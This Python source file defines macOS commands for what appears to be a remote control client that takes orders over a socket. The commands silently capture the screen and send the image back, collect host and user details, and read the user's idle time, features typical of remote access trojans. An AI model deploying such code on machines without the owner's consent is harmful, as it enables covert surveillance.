import os
import subprocess
import sys
import time

from client.commands.common import CommonCommands
from core.utils.decorator import desc
from core.utils.common_util import get_time, get_size, format_dict
from core.utils.logger import logger


class MacCommands(CommonCommands):
    """macOS 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)

    # ------------------ 内部工具 ------------------ #
    def _run_readonly_command(self, command: str):
        """
        执行只读系统命令并返回标准结果格式
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            if result.returncode == 0:
                return 1, result.stdout
            return 0, result.stderr or f'Command exited with code {result.returncode}'
        except Exception as e:
            return 0, f'Failed to execute command: {e}'

    def _run_command_output(self, command: str) -> str:
        """
        运行命令并返回文本输出
        """
        return subprocess.getoutput(command).strip()

    # ------------------ 已有命令优化 ------------------ #
    @desc("Capture a screenshot")
    def screenshot(self):
        screenshot_path = f'screenshot_{get_time()}.png'
        capture_command = f'screencapture -x {screenshot_path}'

        try:
            self._send_interim_result(1, f'Capturing screen: {capture_command}')
            os.system(capture_command)

            if not os.path.isfile(screenshot_path):
                self._send_final_result(0, 'Failed to capture screenshot')
                return

            self._send_interim_result(1, 'Screenshot captured successfully')
            self._send_interim_result(
                1,
                f'Preparing file transfer: {get_size(os.path.getsize(screenshot_path))}'
            )
            self.socket.send_file(self.command_id, screenshot_path)
        except Exception as e:
            self._send_final_result(0, f'Failed to capture screenshot: {e}')
        finally:
            if os.path.isfile(screenshot_path):
                try:
                    os.remove(screenshot_path)
                except Exception:
                    pass

    @desc('Show system information')
    def getinfo(self):
        system_info = {}
        try:
            import platform
            import psutil

            process = psutil.Process()
            executable_path = os.path.realpath(sys.executable)
            script_path = os.path.realpath(''.join(sys.argv))

            system_info['hostname'] = platform.node()
            system_info['macos_version'] = platform.mac_ver()[0]
            system_info['build_version'] = self._run_command_output('sw_vers -buildVersion')
            system_info['architecture'] = platform.machine()
            system_info['hardware_model'] = self._run_command_output('sysctl -n hw.model')
            system_info['cpu_brand'] = self._run_command_output('sysctl -n machdep.cpu.brand_string')
            system_info['cpu_cores'] = os.cpu_count()
            system_info['memory'] = f'{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB'
            system_info['python_version'] = platform.python_version()
            system_info['process_id'] = os.getpid()
            system_info['current_user'] = process.username()
            system_info['launch_command'] = f'{executable_path} {script_path}'
            system_info['process_uptime'] = f'{round(time.time() - process.create_time(), 2)}s'
            system_info['cwd'] = os.getcwd()
        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to collect system information: {e}'

        return 1, format_dict(system_info)

    @desc('Show user idle time')
    def idletime(self):
        try:
            from Quartz import (
                CGEventSourceSecondsSinceLastEventType,
                kCGEventSourceStateHIDSystemState,
                kCGAnyInputEventType,
            )

            idle_seconds = CGEventSourceSecondsSinceLastEventType(
                kCGEventSourceStateHIDSystemState,
                kCGAnyInputEventType
            )
            return 1, f'User idle time: {idle_seconds:.2f} seconds'
        except Exception as e:
            return 0, f'Failed to read idle time: {e}'